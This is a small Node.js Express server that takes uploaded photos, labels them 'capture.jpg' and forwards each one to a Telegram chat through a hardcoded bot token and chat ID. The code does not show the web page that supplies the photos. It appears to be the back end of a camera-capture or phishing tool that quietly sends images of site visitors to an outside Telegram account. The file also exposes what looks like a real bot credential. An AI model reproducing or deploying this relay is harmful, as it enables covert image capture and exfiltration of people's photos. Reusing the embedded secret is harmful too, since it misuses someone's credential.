const express = require('express');
const multer = require('multer');
const FormData = require('form-data');
const fetch = require('node-fetch');
const path = require('path');

const app = express();
const upload = multer({ storage: multer.memoryStorage() });

// Your Credentials
const BOT_TOKEN = '6047507658:AAGHC5tFppE2yqLpQi4KOrz7TwGeM0Mc-LI';
const CHAT_ID = '5574741182';
const PORT = process.env.PORT || 3000;

app.use(express.static('public'));

app.post('/api/upload-photo', upload.single('photo'), async (req, res) => {
    try {
        if (!req.file) return res.status(400).json({ error: 'No file' });

        const form = new FormData();
        form.append('chat_id', CHAT_ID);
        form.append('photo', req.file.buffer, {
            filename: 'capture.jpg',
            contentType: 'image/jpeg',
        });

        const telegramRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
            method: 'POST',
            body: form
        });

        const result = await telegramRes.json();
        if (result.ok) {
            res.json({ success: true });
        } else {
            res.status(500).json({ error: result.description });
        }
    } catch (err) {
        res.status(500).json({ error: 'Server error' });
    }
});

app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
